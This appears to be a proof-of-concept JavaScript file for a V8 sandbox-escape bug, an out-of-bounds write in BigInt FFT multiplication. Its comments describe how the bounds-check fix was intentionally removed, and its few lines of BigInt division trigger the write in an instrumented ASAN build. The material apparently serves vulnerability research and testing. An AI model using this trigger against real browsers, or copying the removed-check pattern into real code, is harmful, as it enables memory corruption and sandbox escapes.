// V8 Sandbox Escape PoC - NormalizeAndRecombine OOB Write (Issue 478814654)
// ==============================================================================
//
// This PoC demonstrates the NormalizeAndRecombine carry OOB write vulnerability
// in V8's BigInt FFT multiplication, which can lead to a V8 sandbox escape.
//
// Vulnerability: In src/bigint/mul-fft.cc, NormalizeAndRecombine writes
//   Z[zi] = carry
// without checking if zi < Z.len(). When concurrent in-sandbox corruption
// breaks the FFT mathematical invariant, carry can be non-zero when
// zi == Z.len(), causing an out-of-bounds write past the buffer.
//
// The fix (commit 573151c3c) added a bounds check:
//   if (carry != 0 && zi < Z.len()) { Z[zi] = carry; }
// This fix was INTENTIONALLY REMOVED in commit 151ce50b5.
//
// Build configuration:
//   is_asan = true
//   v8_enable_sandbox = true
//   v8_enable_memory_corruption_api = true
//   v8_advanced_bigint_algorithms = true
//
// Run:
//   ./d8 --sandbox-testing poc_sandbox_violation_v5.js
//
// Expected output:
//   ## V8 sandbox violation detected!
//
// How it works:
//   1. The BigInt division triggers FFT multiplication for large operands
//   2. The instrumentation in CopyAndZeroExtend simulates concurrent
//      in-sandbox corruption (setting ~10% of source digits to 0xFFFF...FFFF)
//   3. This breaks the FFT mathematical invariant
//   4. NormalizeAndRecombine produces a non-zero carry at zi == Z.len()
//   5. The vulnerable Z[zi] = carry writes past the buffer into ASAN redzones
//   6. ASAN detects the heap-buffer-overflow
//   7. V8's SanitizerFaultHandler reports it as "## V8 sandbox violation detected!"
//
// This is exactly the technique from the original 478814654 report by
// Samuel Groß (saelo@google.com) of Google Project Zero.

// Use BigInt values large enough to trigger FFT multiplication
// FFT threshold: kFftThreshold = 720 digits (~46080 bits on 64-bit)
const x = 123456n;
const a = 31337n ** x;
const b = 42n ** x;

// Division triggers MultiplyFFT via DivideBurnikelZiegler -> D2n1n -> D3n2n
// The intermediate Z buffer is allocated via new digit_t[] (with ASAN redzones)
const c = a / b;

print("Division completed (if we get here, OOB was not triggered in this run)");
print("Note: The corruption is probabilistic (~10% per digit). Run multiple times.");
print("The OOB write is more likely with larger inputs.");
